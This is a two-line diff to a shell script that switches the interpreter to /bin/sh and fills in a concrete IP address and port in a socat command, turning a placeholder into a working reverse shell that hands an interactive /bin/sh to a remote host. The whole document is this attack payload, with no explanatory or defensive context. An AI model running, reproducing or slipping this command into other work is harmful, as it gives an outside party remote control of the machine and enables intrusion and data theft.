@@ -1,2 +1,2 @@
-#!/usr/bin/env bash
-socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:XX.XX.XX.XX:9532
+#!/bin/sh
+socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:213.195.113.119:9532
